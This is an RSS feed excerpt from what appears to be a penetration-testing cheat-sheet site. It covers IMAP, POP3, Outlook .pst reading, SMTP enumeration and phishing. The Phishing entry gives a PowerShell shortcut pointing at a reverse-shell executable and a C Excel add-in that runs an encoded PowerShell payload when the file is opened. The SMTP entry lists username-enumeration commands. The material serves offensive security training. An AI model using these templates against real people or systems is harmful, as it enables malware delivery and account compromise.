channel.title: Email on TLDRBins
channel.description: Recent content in Email on TLDRBins

item.title: IMAP
item.description: IMAP/IMAPS # Connect to IMAP over ssl rlwrap openssl s_client -connect <TARGET>:993 $ rlwrap openssl s_client -connect 10.10.10.197:993 Connecting to 10.10.10.197 CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US verify error:num=18:self-signed certificate verify return:1 depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US verify error:num=10:certificate has expired notAfter=May 14 17:14:21 2021 GMT verify return:1 depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US notAfter=May 14 17:14:21 2021 GMT verify return:1 --- Certificate chain 0 s:CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US i:CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, error: certificate has expired --- New, TLSv1.

item.title: Microsoft Oulook Email Folder
item.description: Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst '<PST_FILE>' $ readpst 'Access Control.pst' Opening PST file and indexes... Processing Folder "Deleted Items" "Access Control" - 2 items done, 0 items skipped. # Open .mbox (plaintext) cat '<MBOX_FILE>' $ cat 'Access Control.mbox' From "john@megacorp.com" Fri Aug 24 07:44:07 2018 Status: RO From: john@megacorp.com <john@megacorp.com> Subject: MegaCorp Access Control System "security" account To: 'security@accesscontrolsystems.

item.title: Phishing
item.description: lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk") $link.TargetPath = "C:\ProgramData\rev.exe" $link.Save() shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<POWERSHELL_3_BASE64>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.

item.title: POP3
item.description: Basic # Connect to POP3 mail server telnet <TARGET> 110 # Send cmd after +OK USER <USER> PASS <PASSWORD> # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit

item.title: SMTP
item.description: Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f"[+] Received a mail.") print("=" * 50) print(envelope.content.decode()) print("=" * 50) return "250 OK" handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname="0.0.0.0", port=25) server.start() print("[*] Listening on 0.0.0.0:25") input("[*] Server started. Press Return to quit.\n") server.stop() Users Enum nmap script smtp-user-enum nmap -p 25 --script=smtp-enum-users <TARGET> # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t <TARGET> # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.
